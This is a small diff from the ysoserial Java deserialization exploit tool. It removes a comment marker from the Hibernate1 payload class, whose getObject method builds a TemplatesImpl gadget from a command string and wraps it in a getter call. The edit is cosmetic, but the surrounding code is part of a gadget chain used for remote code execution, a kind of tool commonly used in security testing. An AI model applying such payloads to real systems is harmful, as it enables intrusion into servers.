@@ -100,7 +100,7 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {
      * @see ysoserial.payloads.ObjectPayload#getObject(java.lang.String)
      */
     public Object getObject ( String command ) throws Exception {
-        Object tpl = Gadgets.createTemplatesImpl(command); // $NON-NLS-1$
+        Object tpl = Gadgets.createTemplatesImpl(command);
         Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
         return makeCaller(tpl, getters);
     }
